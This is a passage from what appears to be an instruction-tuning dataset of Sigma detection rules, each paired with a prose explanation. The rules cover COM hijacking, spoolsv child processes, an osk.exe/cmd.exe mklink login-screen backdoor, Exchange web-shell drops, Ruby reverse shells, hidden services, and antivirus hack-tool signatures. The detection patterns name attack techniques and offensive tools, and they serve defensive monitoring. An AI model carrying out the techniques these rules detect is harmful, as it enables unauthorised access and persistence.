filter_nvidia:\n        Details|contains: '\\FileRepository\\nvmdi.inf'\n    filter_edge:\n        Image|endswith: '\\MicrosoftEdgeUpdateComRegisterShell64.exe'\n    filter_dx:\n        Image: 'C:\\WINDOWS\\SYSTEM32\\dxdiag.exe'\n    filter_python:\n        Details:\n            - 'C:\\Windows\\pyshellext.amd64.dll'\n            - 'C:\\Windows\\pyshellext.dll'\n    filter_bonjourlib:\n        Details:\n            - 'C:\\Windows\\system32\\dnssdX.dll'\n            - 'C:\\Windows\\SysWOW64\\dnssdX.dll'\n    filter_printextensionmanager:\n        Details: 'C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll'\n    filter_programfiles:\n        Details|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_programdata:\n        Details|startswith: 'C:\\ProgramData\\Microsoft\\'\n    filter_gameservice:\n        Details|contains: 'C:\\WINDOWS\\system32\\GamingServicesProxy.dll'\n    filter_poqexec:\n        Image: 'C:\\Windows\\System32\\poqexec.exe'\n        Details|contains: 'C:\\Windows\\System32\\Autopilot.dll'\n    filter_sec_health_svc:\n        Image: 'C:\\Windows\\system32\\SecurityHealthService.exe'\n        Details|contains: 'C:\\Windows\\System32\\SecurityHealth'\n    filter_inprocserver:\n        Image:\n            - 'C:\\Windows\\System32\\poqexec.exe'\n            - 'C:\\Windows\\System32\\regsvr32.exe'\n        TargetObject|endswith: '\\InProcServer32\\(Default)'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level\nlevel: medium\n",
      "question": "potential COM object hijacking leveraging the COM Search Order",
      "answer": "In order to detect potential COM object hijacking leveraging the COM Search Order, you should focus on monitoring registry set actions within the Windows environment, specifically targeting new COM server entries being established in the user's hive. This entails looking for registry operations where the EventType is \"SetValue\" and the TargetObject begins with either 'HKCR\\CLSID\\' or 'HKCU\\Software\\Classes\\CLSID\\'. Moreover, it is crucial that these operations are ending with '\\InprocServer32\\(Default)' to pinpoint the exact nature of the potential hijacking attempt.\n\nTo refine detection accuracy and minimize false positives, a range of filters should be applied to exclude operations related to standard or benign activities. These filters include but are not limited to excluding operations that contain references to system directories like '%%systemroot%%\\system32\\' and '%%systemroot%%\\SysWow64\\', which are common places for legitimate software operations. Similarly, activities related to frequently used applications such as OneDrive, Microsoft Teams, Dropbox, and Nvidia, among others, necessitate exclusions based on specific paths or files associated with these applications. Exclusions also cover updates and processes from Windows Defender, Edge browser activities, and other system utilities like DirectX diagnostics or Python shell extensions, to name a few.\n\nMoreover, it's imperative to consider that some installed utilities, like OneDrive, might legitimately register new COM objects at the user level, which could be flagged as false positives. Thus, while maintaining vigilance for COM object hijacking attempts, it\u2019s crucial to balance sensitivity to potential threats with the understanding of normal system and application behaviors. The overarching goal is to safeguard against malicious COM object registrations that could be exploited for hijacking, while allowing legitimate registry modifications associated with routine software installation and system updates. This approach is informed by identifying misuse of the COM search order to subvert system processes or applications by registering malicious COM objects, a tactic often utilized in persistence, privilege escalation, or other malicious endeavors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious print spool service (spoolsv.exe) child processes..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious print spool service (spoolsv.exe) child processes, you should monitor process creation events on Windows systems for specific conditions. First, look for instances where spoolsv.exe, which runs at the system integrity level, spawns child processes. Be particularly vigilant for child processes executing files commonly associated with unrestricted command execution or network operations that attackers frequently exploit, such as gpupdate.exe, whoami.exe, nltest.exe, taskkill.exe, wmic.exe among others, including networking utilities like net.exe and powerful system tools like cmd.exe and powershell.exe.\n\nBe wary of certain command-line parameters that might indicate nefarious activities, such as attempts to manipulate network settings or execute unusual commands. Specifically, scrutinize command lines for additions like '.spl', which might not commonly appear in legitimate scenarios, or network configuration changes indicative of lateral movement or establishing persistence.\n\nClosely investigate any activity involving rundll32.exe, especially if the command line ends with 'rundll32.exe', since it's a common method for executing malicious code stealthily.\n\nGiven these specifications, any detection should be treated with a high level of suspicion, considering the potential for false positives is unknown. The fields crucial for a detailed investigation in these cases are the name of the executed image (Image) and the full command line used for execution (CommandLine).",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel: System\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel: System\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious print spool service (spoolsv.exe) child processes.",
      "answer": "In order to detect suspicious print spool service (spoolsv.exe) child processes, you should monitor process creation events on Windows systems for specific conditions. First, look for instances where spoolsv.exe, which runs at the system integrity level, spawns child processes. Be particularly vigilant for child processes executing files commonly associated with unrestricted command execution or network operations that attackers frequently exploit, such as gpupdate.exe, whoami.exe, nltest.exe, taskkill.exe, wmic.exe among others, including networking utilities like net.exe and powerful system tools like cmd.exe and powershell.exe.\n\nBe wary of certain command-line parameters that might indicate nefarious activities, such as attempts to manipulate network settings or execute unusual commands. Specifically, scrutinize command lines for additions like '.spl', which might not commonly appear in legitimate scenarios, or network configuration changes indicative of lateral movement or establishing persistence.\n\nClosely investigate any activity involving rundll32.exe, especially if the command line ends with 'rundll32.exe', since it's a common method for executing malicious code stealthily.\n\nGiven these specifications, any detection should be treated with a high level of suspicion, considering the potential for false positives is unknown. The fields crucial for a detailed investigation in these cases are the name of the executed image (Image) and the full command line used for execution (CommandLine)."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\", which provides an elevated command prompt to the user from the login screen without the need to log in, you should: Monitor Windows process creation logs for occurrences where \"cmd.exe\" is either the image being executed or originally named in the file metadata. Specifically, look for command line instances containing the terms 'mklink', '\\osk.exe', and '\\cmd.exe' together. These criteria indicate an attempt to misuse accessibility features to gain unauthorized access to the system from the login screen. The detection focuses on the manipulation of system features and commands indicative of Privilege Escalation and Persistence tactics, which are often utilized in various cyber attacks to maintain access and elevate privileges within a target system without detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.",
      "answer": "In order to detect the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\", which provides an elevated command prompt to the user from the login screen without the need to log in, you should: Monitor Windows process creation logs for occurrences where \"cmd.exe\" is either the image being executed or originally named in the file metadata. Specifically, look for command line instances containing the terms 'mklink', '\\osk.exe', and '\\cmd.exe' together. These criteria indicate an attempt to misuse accessibility features to gain unauthorized access to the system from the login screen. The detection focuses on the manipulation of system features and commands indicative of Privilege Escalation and Persistence tactics, which are often utilized in various cyber attacks to maintain access and elevate privileges within a target system without detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'UMWorkerProcess.exe'\n    filter:\n        TargetFilename|endswith:\n            - 'CacheCleanup.bin'\n            - '.txt'\n            - '.LOG'\n            - '.cfg'\n            - 'cleanup.bin'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - TargetFilename\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'UMWorkerProcess.exe'\n    filter:\n        TargetFilename|endswith:\n            - 'CacheCleanup.bin'\n            - '.txt'\n            - '.LOG'\n            - '.cfg'\n            - 'cleanup.bin'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - TargetFilename\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n",
      "answer": "In order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of ruby with the \"-e\" flag and calls to \"socket\" related functions. This could be an indication of a potential attempt to setup a reverse shell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of ruby with the \"-e\" flag and calls to \"socket\" related functions, which could be an indication of a potential attempt to setup a reverse shell, you should monitor process creation logs on Linux systems for instances where the command line includes execution of the 'ruby' command. Specifically, look for commands that utilize the '-e' option along with references to 'rsocket' or 'TCPSocket', which are indicative of socket-related operations that could be employed in the establishment of a reverse shell. Additionally, pay attention to whether these commands are executed within common shell environments, as indicated by the presence of shell names such as 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', or 'tcsh' within the command line. This approach allows for the identification of suspicious behavior that aligns with tactics and techniques related to the execution of potentially malicious code and the use of application layer protocols to facilitate command and control activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: 'ruby'\n        CommandLine|contains|all:\n            - ' -e'\n            - 'rsocket'\n            - 'TCPSocket'\n        CommandLine|contains:\n            - ' ash'\n            - ' bash'\n            - ' bsh'\n            - ' csh'\n            - ' ksh'\n            - ' pdksh'\n            - ' sh'\n            - ' tcsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: 'ruby'\n        CommandLine|contains|all:\n            - ' -e'\n            - 'rsocket'\n            - 'TCPSocket'\n        CommandLine|contains:\n            - ' ash'\n            - ' bash'\n            - ' bsh'\n            - ' csh'\n            - ' ksh'\n            - ' pdksh'\n            - ' sh'\n            - ' tcsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of ruby with the \"-e\" flag and calls to \"socket\" related functions. This could be an indication of a potential attempt to setup a reverse shell",
      "answer": "In order to detect execution of ruby with the \"-e\" flag and calls to \"socket\" related functions, which could be an indication of a potential attempt to setup a reverse shell, you should monitor process creation logs on Linux systems for instances where the command line includes execution of the 'ruby' command. Specifically, look for commands that utilize the '-e' option along with references to 'rsocket' or 'TCPSocket', which are indicative of socket-related operations that could be employed in the establishment of a reverse shell. Additionally, pay attention to whether these commands are executed within common shell environments, as indicated by the presence of shell names such as 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', or 'tcsh' within the command line. This approach allows for the identification of suspicious behavior that aligns with tactics and techniques related to the execution of potentially malicious code and the use of application layer protocols to facilitate command and control activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should: monitor for PowerShell script activities within Windows environments, specifically focusing on Script Block Logging. You're looking for scripts attempting to manipulate service security descriptors in a manner that could hide the services from typical management tools. This involves identifying scripts containing arguments like '-SecurityDescriptorSddl' or '-sd' which are concerned with setting new security descriptors. Furthermore, the use of 'Set-Service' in combination with specific permission setting strings such as 'D;;', coupled with user rights strings like ';;;IU', ';;;SU', ';;;BA', ';;;SY', or ';;;WD', is a strong indicator of such malicious activity. These commands and permissions are designed to change service visibility and control, which could be an attempt to obscure a service from administrative or security scrutiny. False positives could occur, as these commands might rarely be used for legitimate purposes. However, given the high-risk nature of these actions, any detection should be investigated with appropriate caution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_sddl_flag:\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        ScriptBlockText|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_sddl_flag:\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        ScriptBlockText|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
      "question": "usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)",
      "answer": "In order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should: monitor for PowerShell script activities within Windows environments, specifically focusing on Script Block Logging. You're looking for scripts attempting to manipulate service security descriptors in a manner that could hide the services from typical management tools. This involves identifying scripts containing arguments like '-SecurityDescriptorSddl' or '-sd' which are concerned with setting new security descriptors. Furthermore, the use of 'Set-Service' in combination with specific permission setting strings such as 'D;;', coupled with user rights strings like ';;;IU', ';;;SU', ';;;BA', ';;;SY', or ';;;WD', is a strong indicator of such malicious activity. These commands and permissions are designed to change service visibility and control, which could be an attempt to obscure a service from administrative or security scrutiny. False positives could occur, as these commands might rarely be used for legitimate purposes. However, given the high-risk nature of these actions, any detection should be investigated with appropriate caution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of grep to identify information about the operating system architecture, often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\", you should: Monitor process creation logs on Linux systems for any instance where the 'grep' command ends its execution path, indicating it's being used. Additionally, pay attention to cases where the command line arguments end with architecture information keywords such as 'aarch64', 'arm', 'i386', 'i686', 'mips', or 'x86_64'. These indicators can suggest an attempt to pinpoint the architecture of the operating system, which may be a precursor or component of a larger reconnaissance strategy. It is important to capture all conditions where both the specific use of 'grep' and these architecture-related command line arguments occur together. However, be aware that this rule might produce unknown false positives, meaning it should be considered as having a low alert level until further verification of malicious intent can be established.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_process:\n        Image|endswith: '/grep'\n    selection_architecture:\n        CommandLine|endswith:\n            - 'aarch64'\n            - 'arm'\n            - 'i386'\n            - 'i686'\n            - 'mips'\n            - 'x86_64'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_process:\n        Image|endswith: '/grep'\n    selection_architecture:\n        CommandLine|endswith:\n            - 'aarch64'\n            - 'arm'\n            - 'i386'\n            - 'i686'\n            - 'mips'\n            - 'x86_64'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n",
      "answer": "In order to detect the use of grep to identify information about the operating system architecture, often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\", you should: Monitor process creation logs on Linux systems for any instance where the 'grep' command ends its execution path, indicating it's being used. Additionally, pay attention to cases where the command line arguments end with architecture information keywords such as 'aarch64', 'arm', 'i386', 'i686', 'mips', or 'x86_64'. These indicators can suggest an attempt to pinpoint the architecture of the operating system, which may be a precursor or component of a larger reconnaissance strategy. It is important to capture all conditions where both the specific use of 'grep' and these architecture-related command line arguments occur together. However, be aware that this rule might produce unknown false positives, meaning it should be considered as having a low alert level until further verification of malicious intent can be established."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting highly relevant Antivirus alert that reports a hack tool or other attack tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a highly relevant Antivirus alert that reports a hack tool or other attack tool, you should monitor antivirus logs for alerts that identify the presence of known hacking tools or attack tools. Specifically, look for signatures that start with 'HTOOL', 'HKTL', 'SecurityTool', 'Adfind', 'ATK/', 'Exploit.Script.CVE', 'PWS.', or 'PWSX'. Additionally, pay attention to signatures that contain the following strings: 'Hacktool', 'ATK/' (specifically noted for Sophos antivirus), 'Potato', 'Rozena', 'Sbelt', 'Seatbelt', 'SecurityTool', 'SharpDump', 'Sliver', 'Splinter', 'Swrort', 'Impacket', 'Koadic', 'Lazagne', 'Metasploit', 'Meterpreter', 'MeteTool', 'Mimikatz', 'Mpreter', 'Nighthawk', 'PentestPowerShell', 'PowerSploit', 'PowerSSH', 'PshlSpy', 'PSWTool', 'PWCrack', 'Brutel', 'BruteR', 'Cobalt', 'COBEACON', 'Cometer', 'DumpCreds', 'FastReverseProxy', and 'PWDump'.\n\nEnsure that for any detected alert, you collect at least the file name associated with the tool and the user account involved. Given the nature of these signatures, which are closely associated with intrusion tools and frameworks used in cyber attacks, it's highly unlikely that detections would be false positives. Such detections are critical for identifying potential breaches or unauthorized activities within a network, as they may involve attempts at privilege escalation, lateral movement, credential theft, or deploying additional payloads. This monitoring strategy aligns with MITRE ATT&CK tactics and techniques related to the use of credential access tools, discovery tools, defense evasion mechanisms, and execution techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: antivirus\ndetection:\n    selection:\n        - Signature|startswith:\n            - 'HTOOL'\n            - 'HKTL'\n            - 'SecurityTool'\n            - 'Adfind'\n            - 'ATK/'\n            - 'Exploit.Script.CVE'\n            # - 'FRP.'\n            - 'PWS.'\n            - 'PWSX'\n        - Signature|contains:\n            - 'Hacktool'\n            - 'ATK/'  # Sophos\n            - 'Potato'\n            - 'Rozena'\n            - 'Sbelt'\n            - 'Seatbelt'\n            - 'SecurityTool'\n            - 'SharpDump'\n            - 'Sliver'\n            - 'Splinter'\n            - 'Swrort'\n            - 'Impacket'\n            - 'Koadic'\n            - 'Lazagne'\n            - 'Metasploit'\n            - 'Meterpreter'\n            - 'MeteTool'\n            - 'Mimikatz'\n            - 'Mpreter'\n            - 'Nighthawk'\n            - 'PentestPowerShell'\n            - 'PowerSploit'\n            - 'PowerSSH'\n            - 'PshlSpy'\n            - 'PSWTool'\n            - 'PWCrack'\n            - 'Brutel'\n            - 'BruteR'\n            - 'Cobalt'\n            - 'COBEACON'\n            - 'Cometer'\n            - 'DumpCreds'\n            - 'FastReverseProxy'\n            - 'PWDump'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: antivirus\ndetection:\n    selection:\n        - Signature|startswith:\n            - 'HTOOL'\n            - 'HKTL'\n            - 'SecurityTool'\n            - 'Adfind'\n            - 'ATK/'\n            - 'Exploit.Script.CVE'\n            # - 'FRP.'\n            - 'PWS.'\n            - 'PWSX'\n        - Signature|contains:\n            - 'Hacktool'\n            - 'ATK/'  # Sophos\n            - 'Potato'\n            - 'Rozena'\n            - 'Sbelt'\n            - 'Seatbelt'\n            - 'SecurityTool'\n            - 'SharpDump'\n            - 'Sliver'\n            - 'Splinter'\n            - 'Swrort'\n            - 'Impacket'\n            - 'Koadic'\n            - 'Lazagne'\n            - 'Metasploit'\n            - 'Meterpreter'\n            - 'MeteTool'\n            - 'Mimikatz'\n            - 'Mpreter'\n            - 'Nighthawk'\n            - 'PentestPowerShell'\n            - 'PowerSploit'\n            - 'PowerSSH'\n            - 'PshlSpy'\n            - 'PSWTool'\n            - 'PWCrack'\n            - 'Brutel'\n            - 'BruteR'\n            - 'Cobalt'\n            - 'COBEACON'\n            - 'Cometer'\n            - 'DumpCreds'\n            - 'FastReverseProxy'\n            - 'PWDump'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "highly relevant Antivirus alert that reports a hack tool or other attack tool",
      "answer": "In order to detect a highly relevant Antivirus alert that reports a hack tool or other attack tool, you should monitor antivirus logs for alerts that identify the presence of known hacking tools or attack tools. Specifically, look for signatures that start with 'HTOOL', 'HKTL', 'SecurityTool', 'Adfind', 'ATK/', 'Exploit.Script.CVE', 'PWS.', or 'PWSX'. Additionally, pay attention to signatures that contain the following strings: 'Hacktool', 'ATK/' (specifically noted for Sophos antivirus), 'Potato', 'Rozena', 'Sbelt', 'Seatbelt', 'SecurityTool', 'SharpDump', 'Sliver', 'Splinter', 'Swrort', 'Impacket', 'Koadic', 'Lazagne', 'Metasploit', 'Meterpreter', 'MeteTool', 'Mimikatz', 'Mpreter', 'Nighthawk', 'PentestPowerShell', 'PowerSploit', 'PowerSSH', 'PshlSpy', 'PSWTool', 'PWCrack', 'Brutel', 'BruteR', 'Cobalt', 'COBEACON', 'Cometer', 'DumpCreds', 'FastReverseProxy', and 'PWDump'.\n\nEnsure that for any detected alert, you collect at least the file name associated with the tool and the user account involved. Given the nature of these signatures, which are closely associated with intrusion tools and frameworks used in cyber attacks, it's highly unlikely that detections would be false positives. Such detections are critical for identifying potential breaches or unauthorized activities within a network, as they may involve attempts at privilege escalation, lateral movement, credential theft, or deploying additional payloads. This monitoring strategy aligns with MITRE ATT&CK tactics and techniques related to the use of credential access tools, discovery tools, defense evasion mechanisms, and execution techniques."
    }
  },
  {
